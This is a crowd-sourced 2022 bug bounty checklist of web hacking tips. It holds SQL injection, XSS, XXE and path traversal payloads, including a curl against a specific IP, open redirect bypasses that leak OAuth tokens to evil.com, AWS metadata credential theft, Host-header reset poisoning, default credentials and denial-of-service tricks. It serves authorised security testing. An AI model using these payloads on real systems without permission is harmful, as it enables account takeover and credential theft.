# BugBounty Check list -- 2022 {{Need to add more}}
```
Please add your contribution
```

- Any expired reset password link can still be used to reset the password.
- Ultimate MySQL Injection Payload (Detetify)
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
- if file.php?url=/admin/ redirects to https://website.com/admin/, Put URL file.php?url=@google.com, now it is website.com@google.com which redirects to http://google.com
- in some cases you can have open redirect using %0d%0a and two "/" directly on the main url: http://victim//%0d%0ahttp://google.com
- try to change protocol to bypass open redirect protection, from http://target.com to ftp://target.com
- http:sitetoredirect,http%3asitetoredirect,http%253asitetoredirect mostly works, for open redirect bugs
- Always check the content of a redirect page(302,301), espcially if it requires authentication, and remember, a redirection page is a good place to test for crlf and open redirection.
- for open redirect, try using the character: °, the website thinks it's redirecting to a page on the site but browsers converts it to a dot ".", thus completing the redirect. Usage: ?url=//google° com becomes google.com, url encoded: %E3%80%82
- "%0d/domain_address" is one of the best bypasses in account takeover stealing tokens.
- when parameter value is prefixed in location header:
	http://victim.com?url=//attacker.com -- > Location: //attacker.com-foobar
	http://victim.com?url=//attacker.com/? -- > Location: //attacker.com/?-foobar
- Always add slash at the end of the payload
- when you find xss in open redirection in signon/in pages, just capture the credentials and hijack them.
- Open Redirect Bypass: /path?redirect=//2130706433 or /path?redirect=//0x7f000001 It will redirect you to 127.0.0.1
- bypass most filters with this payload: http:http:evil[.]com http:/evil%252ecom ///www.x.com@evil.com
- use the chinese dot instead of the regular dot to bypass open redirect and ssrf protection, "%E3%80%82", poc: ?redirect=////evil%3E%80%82com
- most sites usually redirect the user after some type of action such as logging in, logging out, password change, signup. The parameter can usually be found in the URL, or sometimes you need to hunt in .js files for referenced parameters. It is highly likely that the login page will handle some type of redirect parameter so make sure to look deeply!. Once you have discovered one parameter name used for redirecting then typically developers will re-use code/parameter names throughout so test this parameter on every endpoint you discover. 
- When authenticating on certain websites they will use an Oauth flow which will look like: https://www.example.com/oauth?client_id=123&scope=email&response_type=code&return_uri=https://www.example.com/callback. The way this works is when you authenticate it will return to https://www.example.com/callback along with a ?CODE=, defined in response_type=code.. Changing this to token= will result in #access_token=. The way it works and the parameter names may vary.
- To put it simply, you want to be able to leak a users access_token so you can become them. When authenticating via oauth the final destination with the token is handled by return_uri= (the parameter may vary!), so if you are able to redirect to a site you control, you will be able to leak the token.
- Most Oauth setups will whitelist *.theirdomain.com/*, however thank to our open redirect we can send the user to the following: https://www.example.com/oauth?client_id=123&scope=email&response_type=token&return_uri=https://www.example.com/redirect%3Fgoto=//evil.com. In most cases adding response_type=token is important on most oauth web applications as the hash fragment is smuggled in the redirect, and it's usually a working access token. code= typically has to be "exchanged" for an access_token which will happen elsewhere. So with that said, what will happen is:
	- The user will authenticate and the token will be generated.
	- The web application redirects to https://www.example.com/redirect%3Fgoto=//evil.com#access_token=123
	- The web application redirects to //evil.com#access_token123
	- As you can see, we used the open redirect to "smuggle" the users token to our address. One of the most common issues researchers run into when testing login flows chained with an open url redirect is not testing encoding the values correctly and the redirect fails. For example if your redirect looked like, https://www.example.com/oauth?client_id=123&scope=email&response_type=code&return_uri=https://www.example.com/redirect?goto=//evil.com&thisisneeded=test. The extra parameter is needed for the redirect to work, so always try encoding:

	- https%3A%2F%2Fwww.example.com%2Fredirect%3Fgoto%3D%2F%2Fevil.com%26thisisneeded%3Dtest
	- Sometimes your flow may need to redirect twice, so you can try double encoding on the FINAL URL. The reason for this is because on first redirection it will be url encoded once, then again on the second. If it's already fully url decoded on the first then it may fail.

	- https%3A%2F%2Fexample.com%2F%3Freturnurl%3Dhttps%253A%252F%252Fwww.google.com%252Fredirect%253Fgo%253D%252F%252Fevil

- Imagine you have an endpoint which takes an ?url= parameter but it will only allow you to input local endpoints, such as /example. Now imagine you also have an open redirect at /redirect?goto=//127.0.0.1/. Pointing ?url= to this endpoint may cause their web application to trust the user input (since it is pointing to local endpoint), but process the redirect & show you sensitive information. Remember this is a redirect from their domain which means you have level of trust via their domain (think if you need the Referrer header to contain their domain, now you can)
- When looking for these types of XSS vulnerabilities (via redirect), always look for strings such as window.location, top.location.href, location.. If you see a redirect via these methods then you will be able to achieve XSS as long as no filtering is stopping you.
- Common bypasses for open-redirect:
    \/yoururl.com
    \/\/yoururl.com
    \\yoururl.com
    //yoururl.com
    //theirsite@yoursite.com
    /\/yoursite.com
    https://yoursite.com%3F.theirsite.com/
    https://yoursite.com%2523.theirsite.com/
    https://yoursite?c=.theirsite.com/
    https://yoursite.com#.theirsite.com/
    https://yoursite.com\.thersite.com/
    //%2F/yoursite.com
    ////yoursite.com
    https://theirsite.computer/

    This is when .domain.com* is whitelisted and you can use .computer domain!:

    https://theirsite.com.mysite.com
    /%0D/yoursite.com (Also try %09, %00, %0a, %07)
    java%0d%0ascript%0d%0a:alert(0) j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
    java%07script:prompt`0` java%09scrip%07t:prompt`0`
    /%2F/yoururl.com
    /%5Cyoururl.com
    //google%E3%80%82com
- Using a whitelisted domain or keyword: www.whitelisted.com.evil.com redirect to evil.com
- Using CRLF to bypass "javascript" blacklisted keyword: java%0d%0ascript%0d%0a:alert(0)
- Using "//" & "////" to bypass "http" blacklisted keyword: //google.com, ////google.com
- Using "https:" to bypass "//" blacklisted keyword: https:google.com
- Using "//" to bypass "//" blacklisted keyword (Browsers see // as //): \/\/google.com/, /\/google.com/
- Using "%E3%80%82" to bypass "." blacklisted character: /?redir=google。com, //google%E3%80%82com
- Using null byte "%00" to bypass blacklist filter: //google%00.com
- Using parameter pollution: ?next=whitelisted.com&next=google.com
- Using "@" character, browser will redirect to anything after the "@": http://www.theirsite.com@yoursite.com/
- Creating folder as their domain:
		http://www.yoursite.com/http://www.theirsite.com/
		http://www.yoursite.com/folder/www.folder.com
- Using "?" characted, browser will translate it to "/?":
		http://www.yoursite.com?http://www.theirsite.com/
		http://www.yoursite.com?folder/www.folder.com
- Host/Split Unicode Normalization:
		https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
		http://a.com／X.b.com
- XSS from Open URL - If it's in a JS variable: ";alert(0);//
- XSS from data:// wrapper: http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
- XSS from javascript:// wrapper: http://www.example.com/redirect.php?url=javascript:prompt(1)
- Functionalities usually associated with redirects: Login, Logout, Register & Password reset pages, Change site language, Links in emails. Read JavaScript code
- Responses to look for when fuzzing for open-redirect:
        300 Multiple Choices
        301 Moved Permanently
        302 Found
        303 See Other
        304 Not Modified
        305 Use Proxy
        307 Temporary Redirect
        308 Permanent Redirect
- Try using the same parameter twice: ?next=whitelisted.com&next=google.com
- If periods filtered, use an IPv4 address in decimal notation http://www.geektools.com/geektools-cgi/ipconv.cgi
- Try a double-URL and triple-URL encoded version of payloads
- Try redirecting to an IP address (instead of a domain) using different notations: IPv6, IPv4 in decimal, hex or octal
- For XSS, try replacing alert(1) with prompt(1) & confirm(1)
- If extension checked, try ?image_url={payload}/.jpg
- Try target.com/?redirect_url=.uk (or [any_param]=.uk). If it redirects to target.com.uk, then it’s vulnerable! target.com.uk and target.com are different domains.
- Use /U+e280 RIGHT-TO-LEFT OVERRIDE: https://whitelisted.com@%E2%80%AE@moc.elgoog
- The unicode character U+202E changes all subsequent text to be right-to-left
- Always use paramater pollution in open-redirection (login and signup especially)
- check for an Open-Redirect that’s based On Path-URI and I found that’s website is vulnerable to it WOAH! :
https://www.target01.com//mahdi.com/ It will Redirect you to //mahdi.com/, and because the filter accept any path with Valid Host I Can use that open redirect to steal token: Proof Of Concept: 
	https://www.target01.com/api/OAUTH/?next=https://www.target01.com//mahdi.com/> https://www.target01.com//mahdi.com/?token =xxx&email=xx...> https://mahdi.com/?token=xxx&email=xx..
- Bypass the OAUTH Protection Via [%09]:
- Bypass the OAUTH Protection Via [Double encode for (.) %252E]:
- Account Takeover Through Bypass the Filter with [%5b]:
- Fuzz for whitelist with ffuf
- the state parameter for login.uber.com contained a redirect location instead of a CSRF token. As a result, an attacker could modify the state parameter to have a poisoned central.uber.com path which would redirect to a custom domain after login and allow them to steal an account OAuth access token.
- Referer headers are a common way of determining the user’s original location, since they contain the URL that linked to the current page. Thus, some sites will redirect to the page’s referer URL automatically after certain user actions, like login or logout. In this case, attackers can host a site that links to the victim site to set the referer header of the request, using HTML like the following: <html>  <a href="https://example.com/login">Click here to log in to example.com</a></html>. When a user clicks the link, they’ll be redirected to the location specified by the href attribute of the <a> tag, which is h t t p s ://example.com/login in this example. If example.com uses a referer-based redirect system, the user’s browser would redirect to the attacker’s site after the user visits example.com, because the browser visited example.com via the attacker’s page.
- After-Login Open Redirect 
- Encountered AWS WAF? Just add <! before any payload and you should bypass the waf, example "<!alert(1)"
- when testing cloud environement, look for cloud_metadata.txt. it contains a list of urls to their internal metadata services.
- kibana will return a content length of 217 if it is publicly open and one can access the dashboard without authentication.
- in a cloud test, if you found a .cspkg file it's gold, it's a zip file with all compiled code and config files.
- search for publi trello boards of companies, chances you find login creds and
  api keys, if not n you could find team boards and copmanies.
- Want to find employeess of a company on github, use this "CompanyName" & type=user.
- if you want to know the name of inside-site aws3 bucket, just put %c0 into url.
- found an s3 bucket behind a cdn and can't get the name? change to https and if the response was the same then the bucket name should be the same as hostname.
- look for public google groups of ur target.(groups.google.com/a/companyname.com)
- use intelx.io and inteltechniques.com/menu (record of all pastebins, even removed ones)
- use pastebin.com
- use ideone.com
- try making 301,302,303,307 redirect to gopher:// and send smtp commands, your mail box may fire
- Download.php?file=../config.php ==> 403:
            Download.php?file=. /config.php⨀ ==> 200
            Download.php?file=⊡ /config.php⨀  ==> 200
            Download.php?file= .⊡ /config.php  ==> 200
- The request could not be satisfied. ---> AWS Cloudfront -->possible subdomain takeover
- search copyright string on google to find other website owned by the target, intext: Example.inc"
- compnaies leave their log instances exposed to public, dork: inurl:app/kibana
- forget the subdomain for recon, go for the asn asn and hit the network range organisation, a new world arrises without wafs, a lot of messy ssl certs and unprotected hosts and hidden scopes.
- look for port 2181, check if you are able to subit commands, as there is no auth in place by default in zoo keeper installations.
- if shodan query "ssl:<domain>" doesn't give result try "http://ssl.cert.subject.CN:<domain>"
- port 9090 tcp could be zeus admin panel or could be any other like prometheus, if that's the case you could get running nodes and hostnames.
- default creds to always try: admin:admin, test:test, admin:password, admin:pass, test@test.com:test, test@company.com:test
- when you sign up for a website/email/newsletter/reset pasword, check for the website that hosts the images and logos, in the email u receive, this could u lead to insecure aws3 buckets and scope expansion.
- use this dork to find btbucket repo: intitle:" about atlassion bitbucket"
- copy the copyight in ur target and search it in google,"2020 uber", change the years to previous years, you'll find previous forgotten assets.
- look for google analytics tracking ID, and use https://dnslytics.com/reverse-analytics to discover more assets sharing the same id.
- find subdomains not using https: "http://target.com" - https://
- site: ideone.com | site: codebeautify.org | site:codeshare.io | site:codepen.io | site: repl.it | site: justpaste.it | site: pastebin.com | site: jsfiddle.net | site: trello.com
- one way to reliably bruteforce subdomains: cat /usr/share/seclists/DNS/Discovery/jhaddix.txt | subgen -d domain.com | zdns --nameserver 1.1.1.1 --threads 500 | jq -r "(.data.answers[0].name) | .name"
- if you're playing with an api endpoint, always try to send invalid content-type, you might end up by getting hidden endpoints in the response.
- /api/something --> 400, /api/something?filter=all --> 200
- If you are testing a JSON endpoint, always try to change one letter in the parameter names to make them invalid. I had quite a few cases where the server thrown back an error with all of the accepted parameters
- Leak PII sensitive API Users DATA with URL Path Permutations: /api/users/user@email.com -> /api/users/..%2Fuser@email.com or /api/account/123/ -> /api/account/..%2F..%2F123
- Saw a call to api/v3/login? Check if api/v1/login exists as well. It might be more vulnerable.
- Never assume there’s only one way to authenticate to an API! Modern apps have many API endpoints for AuthN: /api/mobile/login | /api/v3/login | /api/magic_link; etc.. Find and test all of them for AuthN problems.
- Even if the ID is GUID or non-numeric, try to send a numeric value. For example: /?user_id=111 instead of user_id=inon@traceable.ai Sometimes the AuthZ mechanism supports both and it's easier the brute force numbers.
- if they fixed csrf by checking the origin header value, firefox doesn't set the origin header when iframing data:text/html;base64 
- if you see an action being completed in the url, without any csrf token, check if you can post an image on the website or even set your avatar to a remote url, then make it the url of the action, whoever views the image will execute the action
- bypass csrf by setting csrf value to "undefined"
- change single character in csrf token to bypass
- Supply an empty array on the CSRF token parameter.
- Always do directory Brute forcing on all sub-domain even on 403 page. Sometimes you will get .git file and you can download whole web application source code.
- make sure to fuzz on wbsites that immediatly redirects to another host
- found a 403/401 , basic auth o interrestingn locked down domain, look at its archive/web entries, sometimes you win instatnely with api keys and or url structure that leads to unprotected content.
- drop an array in parameters for full path disclosures
- if you run into an empty api subdomain, hit /swagger-ui.html or any other swagger endpoint.
- if you're out of luck with swagger, try: GET application.wadl, GET application.wadl?detail=false (or true), or try OPTIONS api/v1/ ..etc
- sometimes you find thoses pages that forwards to a login page & you can't see the content inside them (ex: /path/to/secret->Google Login) take all these paths and prepend /public/ to all of them
- always check for https://sites.google.com/a/company.net/sites/system/app/pages/meta/dashboard/categories
- if http response contains some sensitive detaims such as passwords, check for these headers,Cache-Control: no-cache,no-store,must-revalidate. Pragma:no-cache
- look for developpers of organization(linkedin..), search them on github, look for public reposs that shouldn't be public.
- /WEB-INF/web.xml --> 403 ...... /./WEB-INF/web.xml -->403 ....... /.//WEB-INF/web.xml --> 200 OK
- use repl.it for internal code , site:repl.it intext:companyname.com, also use codegist.net
- do recon on storage.googleapis.com/companyname .. for internal documentation
- sometimes you can find .sql files in /wp-content/ or /wp-content/vagrant/
- leak PII sensitive API User with url permutation.
- most java web apps allows lfi bypass by just using this ..;/..;/
-  Github => "company name" language:python/bash send_keys
- Github=> "company name" language:powershell pwd => working creds => unauthorized access
- while testing file upload forms on IIS7 servers, you can use .cer files instead of .asp nd get RCE
- if you find 403, try X-Original-Url and X-Rewrite-Url (both set to 403 endpoint)
- always read jquery.js files as well, sometimes you end up finding creds for 3rd party.
- site/file.php --> nothing, site/file.php~ --> source code
- try an OPTION requets on the api root to see available endpoints
- use blind xss as a password
- use security trails to bypass firewals and find originating IP
- use round brackets to inject sql,xss,rce payloads in a valid email: ypurname({}$<>'/*)@email.com'
- ty to recover data from delted accounts by signing up with the old account
- if you see an api endpoint displaying sensitive data, try to add jsonp or callback parameter and try to leak it using xss
- put bxss and bsqli in X-Forwarded-For header
- look inside aPKs for juicy endpoints, just use apktool -d and grep -r 
- check if you can autofill html forms from urls with xss payloads.
- try endpoint bruteforcing on the login page to discover hidden or legacy oauth providers (/oauth/facebook, /oauth/twitter..)
- also inject payloads(xss) in the paramter name
- if you need to uuid for a specific user, just try and register with his username, the response shoudl;d tell you the uuid and user already exsits.
- First of all, get to know your application, spend some time on using it normally but keep burp open
- file.js?v=kjsqfhmd&skin=lfi payload
- url.com/lib///....//....//....//....//....//....//....//....//etc/passwd!
- Start with XSS and SSTI as early as possible if in scope, insert them into every field you se
- Create your own fuzzing lists
- Expand this list with your own findings
- VDP over paid if you want less competition
- Make a user with every role and check if he can directly access pages he should not be able to
- Take away a role and check if the user can still do the actions before logging out
- Look at the session token, does it change? If not, they might be useable for session fixation
- Delete a logged in user and check if he can still do actions before logging out
- For every input field Try to get <a href=#>test</a> an entity in
- Check the error pages (404,403,..) sometimes they contain reflected values
    Trigger a 403 by trying to get the .htaccess file
- Blind command injection can happen so make sure you include a delay command in your fuzzing list
- Make sure you include windows and Linux commands on your fuzzing list
-   Httponly flag?, Secure flag?, Is the domain of the cookie checked?, If not You can write a cookie to a subpath and it will append that to the request. Is cookie reflected in URL GET parameter?
- Try to inject }}{{7*7}}, }}[[7*7]]
- remove the reset token and see if you can reset password
- For every XML input you see, try XXE
- For every document upload, try to upload a docx file. Those can be vulnerable to XXE as well.
- For every picture upload, try to upload an SVG, you can do XXE via SVG as well
- Read the documenation. If there's an API, there might be API docs, google them!
- If there is a mobile app but it's not in scope, the app might communicate with a server that is in scope so think outside of the box
- he url below bypasses the safe redirect and redirects directly to the malicious website.
http://evil.org/%00
- Most (if not all) publicly available examples of OAuth token theft attacks rely on modification of the redirect_uri parameter value in the call to an identity provider in order to steal either an authorization code or an access_token from an authenticated victim. This requires a non-exact match of redirect_uri configured values (e.g. wildcards for subdomains or paths in the URL) for the service provider’s application on the identity provider’s end.
	authorization code: Typically stolen via cross-domain leakage of the callback URL, which contains the precious authorization “code” GET parameter value that is appended to the redirect_uri URL by the identity provider upon redirection.
- 
- Look in the settings if you can find some modules that are not active by default. Every hurdle you take is one that leaves a few other hackers behind
- XXE To retrieve files
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<product>&xxe;</product>
	<adress>&xxe;</adress>
- timing-based enumeration technique. (a timing-based enumeration of user accounts through the authentication endpoint. )
- No password length restriction in reset password endpoint.
- Session not invalidated after after logout or after changin account password (like when a session is captured but it doesn't get expired or invalidated after i logout, i can keep still use the same session, howver jwt session are an exception)
- Look for prefix match cors
- CVE-2021-38314 (/wp-admin/admin-ajax.php?action=136454233f7f7b567bf1310154c66f11)
- Xss and html injection in search boxes.
- See if you can use password reset link to reset password multiple times.(Password Reset Link not expiring after changing password).
- check for unauthorized access to API (kubernetes).
- OneTap Password(OTP) could be vulnerable to account takeover.(if the login or the logout flow includes a userID, change that to victim id).
- always search on openbugbounty.org
- you can bypass csrf by using get request.
- Send a GET request adding the parameter X-Forwarded-For and adding a header X-Forwarded-For, the value the header is your Burp Collaborator or similar (Requestbin, Interactsh, your server, etc). GET /?X-Forwarded-For HTTP/1.1
- see if you can impersonate any account that says user doesn't exist anymore.
- email confirmation bypasses.
- grafana are vulnerable to stored xss.
- look for open or misconfigured s3buckets.
- an exposed debugging endpoint (/debug/pprof) usually on port 9001 (debug/pprof/goroutine).
- Check the env endpoint.
- Passively collect endpoints with gau tool then using uro tool to get unique endpoints, filter image, js, css and other static files, and if you have already found a vulnerable parameter add it to the acquired endpoints and test it again, you can use httpx and ms flag to match the payload.
- check wayback urls for endpoints.
- Check for race condition vulnerabilities with turbo intruder by selecting race.py
-  in file upload upload a file with payload file name such as : "><img src=x onerror=alert(document.cookie);.jpg
- Password Reset Link Works Multiple Times
- check this /common/queryconfig.action endpoint, contains information about usernames and encrypted passwords
- Weak protection against brute-forcing (Notice the API doesn't block me for many requests even I reached more than 33k requests)
- Password reset tokens sent to CSP reporting endpoints or any other 3rd party (Password reset token leak on third party website via Referer header, the referrer the reset token is getting leaked to third party sites. So, the person who has the complete control over that particular third party site can compromise the user accounts easily.)
- Privilage escalation
- Always open port 8000 and 8081 (8081/user/getuser)
- file upload vulnerabiilties
- Remedy SSO default creds: Username: Admin,Password: RSSO#Admin#
- leaked token in the delete invitation request feature and resolved by using the invitation ID instead of the token to look up the user’s invite when deleting an invitation.
- always test for log4j vulnerabilities, it's an endemic cve
- Cisco ASA XSS CVE-2020-3580, This vulnerability targets the saml service within the VPN. It is triggered via a POST request to domain/+CSCOE+/saml/sp/acs?tgname=a
- xss pyalods in registration fields (<svg/onload=confirm(document.cookie)>)
- use google dorking to find admin exposed panels
- onpointerleave to trigger rxss
- Sensei LMS <= 4.4.3 - Unauthenticated Private Messages Disclosure via Rest API (wordpress)
- zendesk subdomain takeover
- fuzz headers for sqli
- use logsensor
- use paramscanner
- - always try race conditions on (upvote..faucets and transfering cfunctions)
- always try put method and upload text files
- No password length restriction in reset password endpoin
- idor in payement status
- check javascript files for api tokens and then go to hackkey/keyhacks to know how to use that key
- always check the source code for the 404 pages
- test all logins with admin/admin and other default creds(root/root)
- check for idors, idors idors
- Sentry for application monitoring and error tracking is vulnerable to blind ssrf in cloudflare
- always hit a not found path in django based apps , chances django debug mode is enabled
- In some idors you just gotta change email via username
- Grafana instances are vulnerable to path traversal: curl http://41.242.91.22:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
- Any expired reset password link can still be used to reset the password
- use shodan for passive ports scan
- HTTP request smuggling vulnerability in Apache HTTP Server 2.4.52 and earlier (CVE-2022-22720)
- exposed gitlab repos
- firebase credentials leak(always check source code and when you find firebase mentionned look for key and database url)
- try to enable 2FA authentication without email verification
- bruteforece not logging failed attempts
- CVE-2022-33891 - Apache Spark Shell Command Injection url+?/doAs=`sleep 7`
- always use cache-checker or cache:
- If wordpress: try /old/config
- Always check port 5000
- sql firewall bypass: ' and(select 1/*!from* [table_guess]) like 1--+ (use intruder for common tables)
- check for /rest/api/latest/
- Always send Post request when seeing Django login portal.
- Always fuzz custom 404
- Burp Regex for Scope Control: .*\.domain\.com$
- Pull root subdomains from final: cat final | rev | cut -d . -f 1-3 | rev | sort -u | tee root.subdomains
- when js files says not found, add .download
- First tip is to use Basic Shodan, Google Dorks & ASN lookups to find target CIDR ranges - If you are attacking a very large program this be thousands of IP addresses but is usually worth it and definetely a background task to consider. You can then import all the scans into something like this for a nice overview: https://ivre.rocks/
- 
- use jsfinder tool to extract urls from js files
- for csrf bypass try theese 4 tips: remove csrf token param, send an empty csrf token, use another session csrf token, try tp predict the csrf token, modify request method to get, replace token with any string of the same lentgh)
- use pastebin
- bypass ratelimit with X-Forwarded-For: tp pwn authentication
- Host header injection in forgot password page
- Test remember me functionnality
- Test password reset or recovery
- Try to bypass 2FA by accessing the content directly
- Try to login using Oauth gmail or facebook to bypass 2FA
- reset password and login to the account to bypass 2FA
- Use old tokens or change the response before rendering it
- Go to reset password page and add two emails while sending the reset password link (you could receive two password reset link)
- Web cache deception (site.com/file/ok.css)
- Php protections can be bypassed using [] such as password=123 ----> password[]=(CSRF tokens too)
- while resetting password change the host header to your server(vps)=secret link to your vps
- try changing system ip per request to bypass rate limit
- password reset poisining via dangling markup (Host: victim.com:'<a href="//attacker.com/?')
- Add X-Forwarded-For: 127.0.0.1 or 1-1000 to bypass the rate limit protection
- login into the valid account and then into invalid one, repeat this process to fool the server to bypass the rate limit protection(observe that your ip is blocked if you submit 3 incorrect logins in a row, however you can reset the counter by logging in to your account before the limit is reached)
- replace the single string value of password with an array of strings containing all of the candidate passwords, for example ("username":"testaccount", "password":["123","lkjhkl","test"...])
- if you enter the wrong code twice, you will be logged out again, bypass it using macros (you need to use burp session handling features to log back in automatically before sending each request)
- try blind xss payloads in user-agent header
- try bxss payload while logging (in forget password,login,signup to generate errors)
- use blind xss payload as your password
- add header in the Proxy>Options(X-Forwarded-Host:ahsan.com)-browse the program and then later click burp>search and try to find your x-forwarded-host value for web-cache deception
- test for CVE-2016-10033:PHP Mailer RCE
- change all the requests to TRACE method to adisclose or access info
- check for : companyname.atlassian.com,jira.companyname.com
- test for vhost
- test for buckets
- check github and dorks (api,tokens,keys,username,password,secret,dev,prod,jenkins,config,ssh,ftp,MYSQL_PASSWORD,admin,awss,bucket,GITHUB_TOKEN)
- accessing missconfigured data of an organisation: https://storage.googleapis.com/<org-name>
- unauthorized access to orgs google groups: https://groups.google.com/a/<domain-name>
- if the site is running ruby on rails then do : Accept: ../../../../../../../../../../../etc/passwd{{
- check for crlf injection.
- bypass open redirection protection
- dork for scribd
- check email verification for admin@site.com
- try site.com/home/...4....json (will disclose all content of the home dir + sensitive info)
- register using myemail@target.com or using myemail%00@email.com then manipulate the response to 200 ok to 302 found
- check allowed characters (<>"'), and space check and special chars(dots)
- check the .js file on the login page, such as login.js
- check the params used on the endpoint (might be listed in the source or ths js)
- check the endpoint in mobile app or the mobile version and see if it has the same endpoint and same params.
- for email takeover, register an email, before confirming change the email, check if the new confirmation email is sent to the first regitered email.
- fuzz for ssti payloads at every parameters such as {{5*5}} and then match string for the result '25'
- sensitive file /rev/config.json
- Register as company mail, intercept the response and change 401 unauthorized to 302 Found-->success
- xml files could contain creds (change request method)
- do recon on gitlab
- you can bypass cloudflare WAF by finding the real IP of the origin server and enter your payload there.
- if you find a dead  bucket, but no domain that serves it. Do look at the csp header directives. They usually remain unchanged and at times, the scripts too are present. Leverage this, or run custom attacks wrt the directive that whitelists the bucket.
- You can use the Burpsuite CO2 SQLMapper plugin to automatically generate and pass all params to @commixproject or @sqlmap!
- search for informative, n/a, duplicate, low severity issues on programs managed and protected by h1, you have nice 30%+ bypasses or not complete fixes.
- When you are re-testing a fixed IDOR, try again with the same requests/params but this time add an HPP attack. Most of the time you got a New Bypass which means a New Bounty
- Always check the content of a Redirection Page (302/301). especially if it requires authentification. 
And remember a Redirection Page is a good place to test issues like CRLF  injection and Open Redirection.
- (Login Bypass): user: '-, pass: '
- Are you able to control the src of an iframe, but Content-Security-Policy is set to: frame-src 'self' ? Load a 404 page from your site, make the 404 the page you want the victim to see.
- even though the majority of the EC2 metadata API is disabled in AWS Glue Dev Endpoints, you can still retrieve temporary credentials for the attached role by curling "http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
- login bypass: username: \ password: ||1#
- X-Forwarded-For: 127.0.0.1: Server is like oh welcome localhost here is all my secrets.
- GET /admin X-Forwarded-For: company IP --> 200 OK
- in some case you find a company using F5 Big IP, & you have a lot of subdomains showing timeout like they don't serve any content. Hit the path /my.policy in all the non-working subdomains, if you get a response with content
- if server only allows GET and POST method, then try adding "X-HTTP-Method -Override: PUT to achieve RCE via PUT method
-  
- github repo takeover (check is the site is pointing to a not found old github repo, you can recreate the repo with same name and takeover)
- try this http://0.0.0.0/administrator/dashboard. to achieve ssrf
- check for HTMLi in comment sections, if achieved you can escalate to csrf and account takeover
- check fir validation vulnerabilities (site.com/emailid=admin@site.com&verified=false, changed id to admin id and changed response code)via logout request using dict protocol (dict)
- use index.of dork for your target
- use google pentest tools for DL
- fuzz for yaml files, they contain credentials (jznkins..etc)
- again fuzz for xml files (they contains p1 data most of times)
- bypass open redirection with this: uri=°/https://evil.com
- you can use http://httpstatus.io for status code 
- use octal encoding to bypass ssrf (in verify link endpoints): 0x7f.0x0.0x0.0x1 (0x7f.0x0.0x0.0x1/administrator/dashboard)
- ssrf via logout request using dict protocol(dict://evil.com)
- try registring the same email with pc and mobile app using two different password (account takeover)
- check for no limit on comment report function (use turbo intruder)
- rate limit in subscribe functionnality
- Password Reset Token Leak Via Referrer ( click on reset password and then click on the link you got in your mail, you can click on any third app icon and intercept the request and you see token is leaked in referer header)
- TRY HOST HEADER INJECTION ON RESET PASSWORD ENDPOINT. (together with an ngrok server or any server, you'll receive a pingback with the reset token)
- analyse the password reset toekn and see it forms any pattern (some tokens are just a portion of the email and the timestamp)
- Add X-Forwarded-Host in reset password endpoint, chances you'll receive a evil.com/resetpassword/token (use ngrok to start a server)
- in reset password request, see if you can add another email parameter for the email you wanna request password reset for. &email=xx@xx.com&email=yy@yy.com, this will send two pass reset emails to both attacker and victim. Basically, the logic in the website creates a reset link for the first email address but send the link to both email addresses mentioned in the request. Now you can reset the account password for the victim email address.
- manipulate the response and change it 200 OK 
- try sign up with an already registered email and manipulate the response.
- use phone number signup in 3rd party apps and then try to link victim's emaim
- check facebook oauth flow nd see if state parametetr is absent then u can account takeover and csrf bypass cuz state acts as csrf
- for api send the request to repeater and intruder, add the endpoint to the intruder and add wordlist and start intruding nd look for 200, when you find 200 do a recursive intruding on that endpoint itself for juicy info.
- change api version (ex: /v2/ to /v1/)
- if you find that target have weak password policy, try to go for no rate limit attacks in poc shows by creating very weak password of your account.
- on reset password , change host to your host and also try to add header such as x-forwarded-host or referrer to your server, chances you'l receive the token
- Check out Auth Bypass method, there is a method for OTP bypass via response manipulation, this can leads to account takeovers.
- check for csrf on change password, change email and change security question.
- search for token leak in response in registration or reset password endpoint.
- look for email bounce issues (dos) in invite links, see if you can send invites to invalid emails, then try to find the email service provider such as AWS SES, Hubspot, Compaign Monitor ( you can find that by checking email headers), once you have the email provider check the hard bounce limit(like AWS SES ranges from2-5% and then 5-10%, and hubsport bounce limit is 5%, for reference many ISPs prefer bounce rate to be under 2%). Once the Hard Bounce Limits are reached, Email Service Provider will block the Company which means, No Emails would be sent to the Users ! A hard bounce is an email that couldn’t be delivered for some permanent reasons. Maybe the email’s a fake address, maybe the email domain isn’t a real domain, or maybe the email recipient’s server won’t accept emails or simply a mistyped Email) , that means from total of 1000 Emails if 100 of them were fake or were invalid that caused all of them to bounce, AWS SES will block your service.
- long password dos attack: Use a Password of length around 150-200 words to check the presense of Length Restriction, If there is no Restriction, Choose a longer password and keep a eye on Response Time. Check if the Application Crashes for few seconds, you should test for this in forgot password and change password fields(usually they are not restricted like registration field)
- Create app and put field like username or address or even profile picture name parameter ( second refrence ) like 1000 character of string. Search A's account from B's account either it will keep on searching for long time or the application will crash (500 - Error Code)
- use a 5000 letter password (not recommended) (https://raw.githubusercontent.com/KathanP19/HowToHunt/master/Application_Level_DoS/Password.txt)
- Go to login page of example.com and enter valid account email and wrong password, try to login with these details for few times(at least 10-20 times).You can use repeater or intruder in burpsuite. If your account get blocked, check the blocking time period.If the blocking time period is more than 30 min .You can report it. (make sure there is no captcha while logging otherwise wae can't automate that, make sure old session are expired after being blocked), If the user get permanently block after some wrong attempts this is considered as P2. If the user get temporarly block this is considered as P3/P4. During report try to add impact by saying that you can permanently block user account by looping this request with some intervals.
